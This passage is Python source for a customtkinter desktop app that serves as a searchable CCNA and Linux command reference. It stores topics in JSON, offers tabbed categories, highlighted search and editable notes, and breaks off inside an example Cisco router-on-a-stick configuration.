import customtkinter as ctk
import json
import os
import re
from tkinter import messagebox
from tkinter import simpledialog

# --- Config & Theme ---
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

class CiscoUnifiedCommander(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Cisco CCNA 200-301 & LINUX MASTER | Complete Command Reference V12.0 - ULTIMATE EDITION")
        self.geometry("1900x1200")
        
        # Database setup
        self.db_file = "cisco_ccna_complete_final.json"
        self.data = self.load_data()
        
        # Set default tab
        self.current_tab = "📘 CCNA Fundamentals"

        # Search state
        self.current_search_query = ""
        self.search_all_tabs = True
        self.search_results = []
        self.current_result_index = -1

        # Layout Configuration
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # --- 1. Top Bar (Search & Controls) ---
        self.top_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.top_frame.grid(row=0, column=0, padx=20, pady=(15, 5), sticky="ew")

        # Logo
        self.logo = ctk.CTkLabel(self.top_frame, text="🎓 CISCO CCNA 200-301 & LINUX MASTER | COMPLETE REFERENCE", 
                               font=("Impact", 28), text_color="#00B4D8")
        self.logo.pack(side="left", padx=(0, 20))

        # Search Frame
        self.search_frame = ctk.CTkFrame(self.top_frame, fg_color="transparent")
        self.search_frame.pack(side="left", padx=10)

        # Search Entry
        self.search_var = ctk.StringVar()
        self.search_var.trace_add("write", self.on_search)
        
        self.search_entry = ctk.CTkEntry(self.search_frame, 
                                       placeholder_text="🔍 Search ANY command - results HIGHLIGHTED in YELLOW", 
                                       width=600, textvariable=self.search_var, font=("Consolas", 14))
        self.search_entry.pack(side="left", padx=(0, 10))

        # Search Options Frame
        self.search_options = ctk.CTkFrame(self.search_frame, fg_color="transparent")
        self.search_options.pack(side="left")

        # Search All Tabs Checkbox
        self.search_all_var = ctk.BooleanVar(value=True)
        self.search_all_check = ctk.CTkCheckBox(self.search_options, text="Search All Tabs", 
                                               variable=self.search_all_var, command=self.on_search_all_toggle,
                                               font=("Arial", 13))
        self.search_all_check.pack(side="left", padx=5)

        # Exact Match Checkbox
        self.exact_match_var = ctk.BooleanVar(value=False)
        self.exact_match_check = ctk.CTkCheckBox(self.search_options, text="Exact Match", 
                                                variable=self.exact_match_var, command=self.on_search,
                                                font=("Arial", 13))
        self.exact_match_check.pack(side="left", padx=5)

        # Clear Search Button
        self.clear_search_btn = ctk.CTkButton(self.top_frame, text="✖ Clear", width=80, height=40, 
                                            fg_color="#555", hover_color="#777", 
                                            command=self.clear_search, font=("Arial", 13))
        self.clear_search_btn.pack(side="left", padx=5)

        # Add Button
        self.add_btn = ctk.CTkButton(self.top_frame, text="➕ Add Topic", command=self.open_add_dialog,
                                   fg_color="#2da44e", hover_color="#2c974b", width=120, height=40, 
                                   font=("Arial", 14))
        self.add_btn.pack(side="right")

        # --- 2. Main Tab View ---
        self.tab_view = ctk.CTkTabview(self, command=self.on_tab_change)
        self.tab_view.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")
        
        # --- Tabs Organization ---
        self.tab_ccna_fundamentals = self.tab_view.add("📘 CCNA Fundamentals")
        self.tab_lan_switching = self.tab_view.add("🔄 LAN Switching")
        self.tab_routing = self.tab_view.add("🌐 Routing")
        self.tab_ip_services = self.tab_view.add("⚙️ IP Services")
        self.tab_security = self.tab_view.add("🔐 Security")
        self.tab_verification = self.tab_view.add("✅ Verification")
        self.tab_linux = self.tab_view.add("🐧 Linux Ops")

        # Scrollable Frames Storage
        self.frames = {}
        tabs_mapping = {
            "📘 CCNA Fundamentals": self.tab_ccna_fundamentals,
            "🔄 LAN Switching": self.tab_lan_switching,
            "🌐 Routing": self.tab_routing,
            "⚙️ IP Services": self.tab_ip_services,
            "🔐 Security": self.tab_security,
            "✅ Verification": self.tab_verification,
            "🐧 Linux Ops": self.tab_linux
        }

        for tab_name, tab_obj in tabs_mapping.items():
            self.frames[tab_name] = ctk.CTkScrollableFrame(tab_obj, label_text=f"📌 {tab_name}")
            self.frames[tab_name].pack(fill="both", expand=True)

        # Initial Load
        self.refresh_ui()

    def clear_search(self):
        """Clear search and reset UI"""
        self.search_var.set("")
        self.search_entry.focus_set()
        self.search_results = []
        self.current_result_index = -1
        self.refresh_ui()

    def on_search_all_toggle(self):
        """Toggle search all tabs"""
        self.search_all_tabs = self.search_all_var.get()
        self.on_search()

    def load_data(self):
        """Load database from file or create default"""
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                print(f"Error loading data: {e}")
                return self.get_ccna_database()
        else:
            defaults = self.get_ccna_database()
            self.save_data(defaults)
            return defaults

    def save_data(self, data):
        """Save database to file"""
        with open(self.db_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)

    def on_tab_change(self):
        """Handle tab change"""
        self.current_tab = self.tab_view.get()
        if self.current_search_query:
            self.refresh_ui(filter_text=self.current_search_query)
        else:
            self.refresh_ui()

    def on_search(self, *args):
        """Execute search with highlighting"""
        self.current_search_query = self.search_var.get().strip()
        
        if not self.current_search_query:
            self.refresh_ui()
            return
            
        if self.search_all_tabs:
            self.search_all_tabs_method()
        else:
            self.refresh_ui(filter_text=self.current_search_query)

    def search_all_tabs_method(self):
        """Search in all tabs and show results"""
        if not self.current_search_query:
            self.refresh_ui()
            return
            
        current_frame = self.frames[self.current_tab]
        
        # Clear current content
        for widget in current_frame.winfo_children():
            widget.destroy()

        # Search results header
        header_frame = ctk.CTkFrame(current_frame, fg_color="transparent")
        header_frame.pack(fill="x", pady=(0, 20))
        
        search_term = self.current_search_query
        exact = self.exact_match_var.get()
        
        ctk.CTkLabel(header_frame, 
                    text=f"🔍 Search Results for: '{search_term}'", 
                    font=("Arial", 24, "bold"), 
                    text_color="#FFD166").pack()
        
        ctk.CTkLabel(header_frame, 
                    text=f"Exact Match: {'ON' if exact else 'OFF'} | Searching ALL Tabs", 
                    font=("Arial", 16), 
                    text_color="#AAAAAA").pack(pady=5)

        # Search in all tabs
        results = []
        for tab_name, tab_data in self.data.items():
            for title, item_data in tab_data.items():
                # Search in title, code, verification, example, notes
                searchable_text = f"{title} {item_data['code']} {item_data.get('verification', '')} {item_data.get('example', '')} {item_data.get('notes', '')}".lower()
                
                if exact:
                    # Exact word boundary matching
                    pattern = r'\b' + re.escape(search_term.lower()) + r'\b'
                    if re.search(pattern, searchable_text):
                        results.append((tab_name, title, item_data))
                else:
                    # Fuzzy/partial matching
                    if search_term.lower() in searchable_text:
                        results.append((tab_name, title, item_data))

        self.search_results = results
        self.current_result_index = -1

        # Display results
        if not results:
            ctk.CTkLabel(current_frame, 
                        text="❌ No matches found in any tab.", 
                        text_color="gray", 
                        font=("Arial", 20)).pack(pady=100)
            return

        # Results count
        ctk.CTkLabel(current_frame, 
                    text=f"✨ Found {len(results)} result(s)", 
                    text_color="#06D6A0", 
                    font=("Arial", 16, "bold")).pack(pady=10)

        # Navigation buttons for results
        nav_frame = ctk.CTkFrame(current_frame, fg_color="transparent")
        nav_frame.pack(pady=10)
        
        ctk.CTkButton(nav_frame, text="⬅️ Previous", width=120, height=35,
                     command=self.prev_result, font=("Arial", 13)).pack(side="left", padx=5)
        ctk.CTkButton(nav_frame, text="➡️ Next", width=120, height=35,
                     command=self.next_result, font=("Arial", 13)).pack(side="left", padx=5)
        
        self.result_label = ctk.CTkLabel(nav_frame, text="", font=("Arial", 14))
        self.result_label.pack(side="left", padx=20)
        self.update_result_counter()

        # Display all results
        for i, (tab_name, title, item_data) in enumerate(results):
            result_title = f"[{tab_name}] {title}"
            self.create_result_card(current_frame, result_title, item_data, tab_name, 
                                  self.current_search_query, i)

    def update_result_counter(self):
        """Update the result counter label"""
        if hasattr(self, 'result_label') and self.search_results:
            current = self.current_result_index + 1 if self.current_result_index >= 0 else 1
            self.result_label.configure(
                text=f"Result {current} of {len(self.search_results)}"
            )

    def next_result(self):
        """Go to next search result"""
        if not self.search_results:
            return
        self.current_result_index = (self.current_result_index + 1) % len(self.search_results)
        self.update_result_counter()

    def prev_result(self):
        """Go to previous search result"""
        if not self.search_results:
            return
        self.current_result_index = (self.current_result_index - 1) % len(self.search_results)
        self.update_result_counter()

    def create_result_card(self, parent, title, item_data, original_tab, highlight_term, index):
        """Create a card for search results"""
        card = ctk.CTkFrame(parent, fg_color=("#e6e6e6", "#2b2b2b"), corner_radius=10)
        card.pack(fill="x", pady=10, padx=15)

        # Highlight if this is the current result
        if index == self.current_result_index:
            card.configure(fg_color=("#FFE66D", "#665A00"))

        # Header
        head_frame = ctk.CTkFrame(card, fg_color="transparent")
        head_frame.pack(fill="x", padx=20, pady=(15, 10))

        lbl = ctk.CTkLabel(head_frame, text=title, font=("Roboto", 18, "bold"), 
                          text_color="#72EFDD" if index != self.current_result_index else "black", 
                          anchor="w")
        lbl.pack(side="left")

        # Buttons
        btn_frame = ctk.CTkFrame(head_frame, fg_color="transparent")
        btn_frame.pack(side="right")

        # Go to Tab Button
        def go_to_tab():
            self.tab_view.set(original_tab)
            self.current_tab = original_tab
            self.refresh_ui(filter_text=highlight_term)
            
        ctk.CTkButton(btn_frame, text=f"📂 Go to {original_tab}", width=160, height=32, 
                     fg_color="#3B8ED0", hover_color="#2a6fa5", 
                     command=go_to_tab, font=("Arial", 12)).pack(side="left", padx=5)

        # Show Example Button
        def show_example():
            self.show_popup("📋 EXAMPLE", item_data.get('example', 'No example provided.'))

        ctk.CTkButton(btn_frame, text="📋 Example", width=90, height=32,
                     fg_color="#8338EC", command=show_example,
                     font=("Arial", 12)).pack(side="left", padx=5)

        # Commands Preview
        content_frame = ctk.CTkFrame(card, fg_color="transparent")
        content_frame.pack(fill="x", padx=20, pady=10)

        # Show first 5 lines of config as preview
        preview_text = "\n".join(item_data['code'].split('\n')[:5]) + "..."
        
        txt_box = ctk.CTkTextbox(content_frame, height=120, 
                                font=("Consolas", 12), 
                                fg_color=("#f0f0f0", "#1e1e1e"), 
                                wrap="none")
        txt_box.insert("1.0", preview_text)
        self.apply_highlighting(txt_box, preview_text, highlight_term)
        txt_box.configure(state="disabled")
        txt_box.pack(fill="x", pady=(0, 10))

    def refresh_ui(self, filter_text=""):
        """Refresh the UI for current tab"""
        if self.current_tab not in self.frames:
            self.current_tab = list(self.frames.keys())[0]
            
        current_frame = self.frames[self.current_tab]
        
        # Clear current content
        for widget in current_frame.winfo_children():
            widget.destroy()

        category_data = self.data.get(self.current_tab, {})
        sorted_keys = sorted(category_data.keys())

        count = 0
        for title in sorted_keys:
            item_data = category_data[title]
            
            if filter_text:
                # Search in all fields
                searchable_text = f"{title} {item_data['code']} {item_data.get('verification', '')} {item_data.get('example', '')} {item_data.get('notes', '')}".lower()
                
                if self.exact_match_var.get():
                    pattern = r'\b' + re.escape(filter_text.lower()) + r'\b'
                    if not re.search(pattern, searchable_text):
                        continue
                else:
                    if filter_text.lower() not in searchable_text:
                        continue

            self.create_card(current_frame, title, item_data, filter_text)
            count += 1
        
        if count == 0 and filter_text:
            ctk.CTkLabel(current_frame, 
                        text=f"❌ No matches found in {self.current_tab}.", 
                        text_color="gray", 
                        font=("Arial", 20)).pack(pady=100)
        elif count == 0:
            ctk.CTkLabel(current_frame, 
                        text="📚 No topics available. Click 'Add Topic' to create one.", 
                        text_color="gray", 
                        font=("Arial", 20)).pack(pady=100)

    def create_card(self, parent, title, item_data, highlight_term=""):
        """Create a card for a topic"""
        card = ctk.CTkFrame(parent, fg_color=("#e6e6e6", "#2b2b2b"), corner_radius=10)
        card.pack(fill="x", pady=15, padx=15)

        # Header
        head_frame = ctk.CTkFrame(card, fg_color="transparent")
        head_frame.pack(fill="x", padx=20, pady=(15, 10))

        lbl = ctk.CTkLabel(head_frame, text=title, font=("Roboto", 20, "bold"), 
                          text_color="#72EFDD", anchor="w")
        lbl.pack(side="left")

        # Buttons Frame
        btn_frame = ctk.CTkFrame(head_frame, fg_color="transparent")
        btn_frame.pack(side="right")

        # Content Boxes
        main_content_frame = ctk.CTkFrame(card, fg_color="transparent")
        main_content_frame.pack(fill="x", padx=20, pady=10)

        # Commands Section
        cmd_label = ctk.CTkLabel(main_content_frame, text="⚡ CONFIGURATION COMMANDS:", 
                                 font=("Consolas", 16, "bold"), text_color="#FFD166", anchor="w")
        cmd_label.pack(anchor="w", pady=(10, 5))
        
        # Calculate height based on content
        code_lines = item_data['code'].count('\n') + 5
        height = max(15, min(40, code_lines)) * 20
        
        txt_box = ctk.CTkTextbox(main_content_frame, height=height, 
                                font=("Consolas", 13), 
                                fg_color=("#f0f0f0", "#1e1e1e"), 
                                wrap="none")
        txt_box.insert("1.0", item_data['code'])
        
        # Zoom controls
        txt_box.bind("<Control-MouseWheel>", lambda e, tb=txt_box: self.zoom_textbox(e, tb))
        txt_box.bind("<Control-plus>", lambda e, tb=txt_box: self.zoom_in(tb))
        txt_box.bind("<Control-minus>", lambda e, tb=txt_box: self.zoom_out(tb))
        txt_box.bind("<Control-0>", lambda e, tb=txt_box: self.zoom_reset(tb))
        
        # Apply highlighting with YELLOW background for search terms
        self.apply_highlighting(txt_box, item_data['code'], highlight_term)
        txt_box.configure(state="disabled")
        txt_box.pack(fill="x", pady=(0, 15))

        # Verification Section
        if 'verification' in item_data and item_data['verification'].strip():
            verify_label = ctk.CTkLabel(main_content_frame, text="✅ VERIFICATION COMMANDS:", 
                                       font=("Consolas", 16, "bold"), text_color="#06D6A0", anchor="w")
            verify_label.pack(anchor="w", pady=(10, 5))
            
            verify_lines = item_data['verification'].count('\n') + 3
            verify_height = max(12, min(30, verify_lines)) * 20
            
            verify_box = ctk.CTkTextbox(main_content_frame, height=verify_height,
                                       font=("Consolas", 13), 
                                       fg_color=("#f0f0f0", "#1e1e1e"), 
                                       wrap="none")
            verify_box.insert("1.0", item_data['verification'])
            
            verify_box.bind("<Control-MouseWheel>", lambda e, tb=verify_box: self.zoom_textbox(e, tb))
            verify_box.bind("<Control-plus>", lambda e, tb=verify_box: self.zoom_in(tb))
            verify_box.bind("<Control-minus>", lambda e, tb=verify_box: self.zoom_out(tb))
            verify_box.bind("<Control-0>", lambda e, tb=verify_box: self.zoom_reset(tb))
            
            self.apply_highlighting(verify_box, item_data['verification'], highlight_term)
            verify_box.configure(state="disabled")
            verify_box.pack(fill="x", pady=(0, 15))

        # ============ INTER-VLAN ROUTING & ROUTER-ON-A-STICK SECTION ============
        if any(x in title.lower() for x in ['inter-vlan', 'router on a stick', 'router-on-stick', 'router on stick', 'intervlan', 'inter vlan']):
            self.add_intervlan_section(main_content_frame, item_data, title, highlight_term)
        
        # ============ ZARRAR SHAR7 (INFO BUTTON) WITH EDIT FUNCTIONALITY ============
        notes_frame = ctk.CTkFrame(main_content_frame, fg_color="transparent")
        notes_frame.pack(fill="x", pady=(15, 5))
        
        # Notes Header with Info Icon
        notes_header = ctk.CTkFrame(notes_frame, fg_color="transparent")
        notes_header.pack(fill="x")
        
        ctk.CTkLabel(notes_header, text="📘 SHAR7 / NOTES:", 
                    font=("Consolas", 16, "bold"), text_color="#FF9F1C", anchor="w").pack(side="left")
        
        # ============ FORMATTING TOOLBAR ============
        # Create a frame for formatting buttons
        format_frame = ctk.CTkFrame(notes_header, fg_color="transparent")
        format_frame.pack(side="left", padx=(10, 0))
        
        # Text Style Buttons
        ctk.CTkButton(format_frame, text="B", width=32, height=28, 
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_bold(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Consolas", 14, "bold")).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame, text="I", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_italic(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Consolas", 14, "italic")).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame, text="U", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_underline(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Consolas", 14, "underline")).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame, text="</>", width=42, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_code(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Consolas", 12)).pack(side="left", padx=2)
        
        # Separator
        ctk.CTkLabel(format_frame, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Alignment Buttons
        ctk.CTkButton(format_frame, text="⬅️", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.align_left(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Arial", 14)).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame, text="⬇️", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.align_center(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Arial", 14)).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame, text="➡️", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.align_right(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Arial", 14)).pack(side="left", padx=2)
        
        # Separator
        ctk.CTkLabel(format_frame, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Color Buttons
        color_frame = ctk.CTkFrame(format_frame, fg_color="transparent")
        color_frame.pack(side="left", padx=2)
        
        colors = [("🔴", "red"), ("🔵", "blue"), ("🟢", "green"), ("🟡", "yellow"), ("🟣", "purple")]
        for icon, color in colors:
            ctk.CTkButton(color_frame, text=icon, width=32, height=28,
                        fg_color="#444", hover_color="#666",
                        command=lambda c=color: self.apply_color(notes_box, c) if notes_box.cget("state") == "normal" else None,
                        font=("Arial", 14)).pack(side="left", padx=2)
        
        # Separator
        ctk.CTkLabel(format_frame, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Font Size
        size_frame = ctk.CTkFrame(format_frame, fg_color="transparent")
        size_frame.pack(side="left", padx=2)
        
        sizes = [("S", "small"), ("M", "medium"), ("L", "large")]
        for text, size in sizes:
            ctk.CTkButton(size_frame, text=text, width=32, height=28,
                        fg_color="#444", hover_color="#666",
                        command=lambda s=size: self.set_font_size(notes_box, s) if notes_box.cget("state") == "normal" else None,
                        font=("Arial", 12)).pack(side="left", padx=2)
        
        # Separator
        ctk.CTkLabel(format_frame, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # List Buttons
        ctk.CTkButton(format_frame, text="•", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.insert_bullet_list(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Arial", 18)).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame, text="1.", width=42, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.insert_numbered_list(notes_box) if notes_box.cget("state") == "normal" else None,
                     font=("Arial", 12)).pack(side="left", padx=2)
        
        # ============ END FORMATTING TOOLBAR ============
        
        # Edit Notes Button
        def edit_notes():
            self.edit_notes_dialog(title, item_data)
            
        ctk.CTkButton(notes_header, text="✏️ EDIT SHAR7", width=120, height=28,
                     fg_color="#E04F5F", hover_color="#c0392b", 
                     command=edit_notes, font=("Arial", 12)).pack(side="right", padx=5)
        
        # ============ PASTE ICON BUTTON - NEW ============
        def paste_to_notes():
            """Paste clipboard content directly into notes box"""
            try:
                # Check if notes box is editable
                if notes_box.cget("state") == "normal":
                    # Get text from clipboard
                    clipboard_text = self.clipboard_get()
                    if clipboard_text:
                        # Insert at cursor position or at the end
                        try:
                            if notes_box.tag_ranges("sel"):
                                notes_box.delete("sel.first", "sel.last")
                            notes_box.insert("insert", clipboard_text)
                        except:
                            notes_box.insert("end", clipboard_text)
                    messagebox.showinfo("✅ Paste", "Text pasted successfully!")
                else:
                    # If notes box is disabled, show message
                    messagebox.showinfo("📋 Paste", "Please click 'EDIT SHAR7' first to enable editing!")
            except:
                messagebox.showerror("❌ Error", "No text found in clipboard!")
        
        ctk.CTkButton(notes_header, text="📋", width=32, height=28,
                     fg_color="#4A6FA5", hover_color="#2a4a7a",
                     command=paste_to_notes, font=("Arial", 16)).pack(side="right", padx=(0, 5))
        
        # Notes Content Box
        notes_content = item_data.get('notes', '⚠️ No SHAR7 added yet. Click "EDIT SHAR7" to add explanation.')
        notes_height = max(8, min(15, notes_content.count('\n') + 3)) * 20
        
        notes_box = ctk.CTkTextbox(main_content_frame, height=notes_height,
                                  font=("Consolas", 13), 
                                  fg_color=("#FFF3E0", "#332211"), 
                                  wrap="word",
                                  border_width=1,
                                  border_color="#FF9F1C")
        notes_box.insert("1.0", notes_content)
        
        # Zoom controls
        notes_box.bind("<Control-MouseWheel>", lambda e, tb=notes_box: self.zoom_textbox(e, tb))
        notes_box.bind("<Control-plus>", lambda e, tb=notes_box: self.zoom_in(tb))
        notes_box.bind("<Control-minus>", lambda e, tb=notes_box: self.zoom_out(tb))
        notes_box.bind("<Control-0>", lambda e, tb=notes_box: self.zoom_reset(tb))
        
        # ============ PASTE FEATURE - Enable paste with keyboard and mouse ============
        notes_box.bind("<Control-v>", lambda e: self.paste_text(e, notes_box))
        notes_box.bind("<Shift-Insert>", lambda e: self.paste_text(e, notes_box))
        notes_box.bind("<Button-2>", lambda e: self.paste_text(e, notes_box))  # Middle mouse button
        
        self.apply_highlighting(notes_box, notes_content, highlight_term)
        notes_box.configure(state="disabled")
        notes_box.pack(fill="x", pady=(0, 15))

        # Function Buttons
        def show_example():
            self.show_popup("📋 EXAMPLE / DESCRIPTION", 
                          item_data.get('example', 'No example provided.'))

        def toggle_edit():
            current_txt_box = txt_box
            current_verify_box = verify_box if 'verify_box' in locals() else None
            
            if edit_btn.cget("text") == "Edit":
                current_txt_box.configure(state="normal", border_width=2, border_color="#E04F5F")
                if current_verify_box:
                    current_verify_box.configure(state="normal", border_width=2, border_color="#E04F5F")
                edit_btn.configure(text="Save", fg_color="#E04F5F", hover_color="#c0392b")
                current_txt_box.focus_set()
            else:
                new_code = current_txt_box.get("1.0", "end-1c")
                new_verify = current_verify_box.get("1.0", "end-1c") if current_verify_box else ""
                
                self.data[self.current_tab][title]['code'] = new_code
                if new_verify:
                    self.data[self.current_tab][title]['verification'] = new_verify
                    
                self.save_data(self.data)
                
                current_txt_box.configure(state="disabled", border_width=0)
                if current_verify_box:
                    current_verify_box.configure(state="disabled", border_width=0)
                edit_btn.configure(text="Edit", fg_color="#444", hover_color="#555")
                messagebox.showinfo("✅ Saved", "Commands updated successfully!")

        def copy_all():
            full_text = f"CONFIGURATION:\n{item_data['code']}\n\nVERIFICATION:\n{item_data.get('verification', 'N/A')}\n\nSHAR7/NOTES:\n{item_data.get('notes', 'N/A')}"
            self.clipboard_clear()
            self.clipboard_append(full_text)
            messagebox.showinfo("✅ Copied", "All commands and notes copied to clipboard!")

        # Action Buttons
        ctk.CTkButton(btn_frame, text="📋 Example", width=100, height=35, 
                     fg_color="#8338EC", hover_color="#6a1fc9", 
                     command=show_example, font=("Arial", 13)).pack(side="left", padx=5)
        
        edit_btn = ctk.CTkButton(btn_frame, text="Edit", width=80, height=35, 
                                fg_color="#444", hover_color="#555", 
                                command=toggle_edit, font=("Arial", 13))
        edit_btn.pack(side="left", padx=5)
        
        ctk.CTkButton(btn_frame, text="📋 Copy All", width=100, height=35, 
                     fg_color="#2da44e", hover_color="#2c974b", 
                     command=copy_all, font=("Arial", 13)).pack(side="left", padx=5)

    # ============ PASTE FUNCTION ============
    def paste_text(self, event, text_widget):
        """Paste text from clipboard into text widget"""
        try:
            # Get text from clipboard
            clipboard_text = self.clipboard_get()
            
            # Insert at cursor position or replace selected text
            try:
                # Check if there's a selection
                if text_widget.tag_ranges("sel"):
                    text_widget.delete("sel.first", "sel.last")
            except:
                pass
                
            # Insert the clipboard text
            text_widget.insert("insert", clipboard_text)
            
            # Return "break" to prevent default paste behavior
            return "break"
        except:
            # If clipboard is empty or error occurs
            pass

    # ============ TEXT FORMATTING FUNCTIONS ============
    def apply_bold(self, text_widget):
        """Apply bold formatting to selected text"""
        try:
            if text_widget.tag_ranges("sel"):
                # Toggle bold tag
                if "bold" in text_widget.tag_names("sel.first"):
                    text_widget.tag_remove("bold", "sel.first", "sel.last")
                else:
                    text_widget.tag_add("bold", "sel.first", "sel.last")
                    text_widget.tag_config("bold", font=("Consolas", 13, "bold"))
        except:
            pass
            
    def apply_italic(self, text_widget):
        """Apply italic formatting to selected text"""
        try:
            if text_widget.tag_ranges("sel"):
                if "italic" in text_widget.tag_names("sel.first"):
                    text_widget.tag_remove("italic", "sel.first", "sel.last")
                else:
                    text_widget.tag_add("italic", "sel.first", "sel.last")
                    text_widget.tag_config("italic", font=("Consolas", 13, "italic"))
        except:
            pass
            
    def apply_underline(self, text_widget):
        """Apply underline formatting to selected text"""
        try:
            if text_widget.tag_ranges("sel"):
                if "underline" in text_widget.tag_names("sel.first"):
                    text_widget.tag_remove("underline", "sel.first", "sel.last")
                else:
                    text_widget.tag_add("underline", "sel.first", "sel.last")
                    text_widget.tag_config("underline", underline=True)
        except:
            pass
            
    def apply_code(self, text_widget):
        """Apply code formatting to selected text"""
        try:
            if text_widget.tag_ranges("sel"):
                if "code" in text_widget.tag_names("sel.first"):
                    text_widget.tag_remove("code", "sel.first", "sel.last")
                else:
                    text_widget.tag_add("code", "sel.first", "sel.last")
                    text_widget.tag_config("code", font=("Consolas", 13), background="#2d2d2d", foreground="#f8f8f2")
        except:
            pass
            
    def align_left(self, text_widget):
        """Align text to left"""
        try:
            if text_widget.tag_ranges("sel"):
                text_widget.tag_add("left", "sel.first", "sel.last")
                text_widget.tag_config("left", justify="left")
        except:
            pass
            
    def align_center(self, text_widget):
        """Align text to center"""
        try:
            if text_widget.tag_ranges("sel"):
                text_widget.tag_add("center", "sel.first", "sel.last")
                text_widget.tag_config("center", justify="center")
        except:
            pass
            
    def align_right(self, text_widget):
        """Align text to right"""
        try:
            if text_widget.tag_ranges("sel"):
                text_widget.tag_add("right", "sel.first", "sel.last")
                text_widget.tag_config("right", justify="right")
        except:
            pass
            
    def apply_color(self, text_widget, color):
        """Apply color to selected text"""
        colors = {
            "red": "#ff6b6b",
            "blue": "#4d9fff",
            "green": "#51cf66",
            "yellow": "#ffd43b",
            "purple": "#cc5de8"
        }
        try:
            if text_widget.tag_ranges("sel"):
                tag_name = f"color_{color}"
                if tag_name in text_widget.tag_names("sel.first"):
                    text_widget.tag_remove(tag_name, "sel.first", "sel.last")
                else:
                    text_widget.tag_add(tag_name, "sel.first", "sel.last")
                    text_widget.tag_config(tag_name, foreground=colors.get(color, "#ffffff"))
        except:
            pass
            
    def set_font_size(self, text_widget, size):
        """Set font size for selected text"""
        sizes = {
            "small": 11,
            "medium": 13,
            "large": 16
        }
        try:
            if text_widget.tag_ranges("sel"):
                tag_name = f"size_{size}"
                if tag_name in text_widget.tag_names("sel.first"):
                    text_widget.tag_remove(tag_name, "sel.first", "sel.last")
                else:
                    text_widget.tag_add(tag_name, "sel.first", "sel.last")
                    text_widget.tag_config(tag_name, font=("Consolas", sizes.get(size, 13)))
        except:
            pass
            
    def insert_bullet_list(self, text_widget):
        """Insert bullet list at cursor"""
        try:
            text_widget.insert("insert", "• ")
        except:
            pass
            
    def insert_numbered_list(self, text_widget):
        """Insert numbered list at cursor"""
        try:
            # Find the last numbered item
            last_num = 1
            try:
                content = text_widget.get("1.0", "insert")
                lines = content.split('\n')
                for line in reversed(lines):
                    if line.strip().startswith(tuple(str(i) + '.' for i in range(1, 100))):
                        last_num = int(line.strip().split('.')[0]) + 1
                        break
            except:
                pass
            text_widget.insert("insert", f"{last_num}. ")
        except:
            pass

    def add_intervlan_section(self, parent_frame, item_data, title, highlight_term):
        """Add Inter-VLAN Routing and Router-on-a-Stick section"""
        
        # Inter-VLAN Section Frame
        iv_frame = ctk.CTkFrame(parent_frame, fg_color=("#222233", "#1a1a2e"), 
                               corner_radius=10, border_width=2, border_color="#4A6FA5")
        iv_frame.pack(fill="x", pady=(20, 10), padx=5)
        
        # Header
        iv_header = ctk.CTkFrame(iv_frame, fg_color="transparent")
        iv_header.pack(fill="x", padx=15, pady=(15, 10))
        
        ctk.CTkLabel(iv_header, text="🔄 INTER-VLAN ROUTING & ROUTER-ON-A-STICK", 
                    font=("Roboto", 18, "bold"), text_color="#88C0D0").pack(side="left")
        
        # Content Frame
        iv_content = ctk.CTkFrame(iv_frame, fg_color="transparent")
        iv_content.pack(fill="x", padx=15, pady=(0, 15))
        
        # ===== 1. STATIC ROUTE CONFIGURATION =====
        static_route_frame = ctk.CTkFrame(iv_content, fg_color=("#2a2a3a", "#1e1e2e"), corner_radius=8)
        static_route_frame.pack(fill="x", pady=8)
        
        ctk.CTkLabel(static_route_frame, text="🌐 STATIC ROUTES FOR INTER-VLAN", 
                    font=("Consolas", 15, "bold"), text_color="#F4A261").pack(anchor="w", padx=15, pady=(10, 5))
        
        static_text = """! === STATIC ROUTES FOR INTER-VLAN ===
! Router-on-a-Stick Configuration
!
! 1. Create Subinterfaces on Router
R1(config)# interface gigabitethernet 0/0.10
R1(config-subif)# encapsulation dot1Q 10
R1(config-subif)# ip address 192.168.10.1 255.255.255.0
R1(config-subif)# no shutdown
!
R1(config)# interface gigabitethernet 0/0.20
R1(config-subif)# encapsulation dot1Q 20
R1(config-subif)# ip address 192.168.20.1 255.255.255.0
R1(config-subif)# no shutdown
!
R1(config)# interface gigabitethernet 0/0.30
R1(config-subif)# encapsulation dot1Q 30
R1(config-subif)# ip address 192.168.30.1 255.255.255.0
R1(config-subif)# no shutdown
!
! 2. Trunk Port on Switch
SW1(config)# interface gigabitethernet 0/1
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
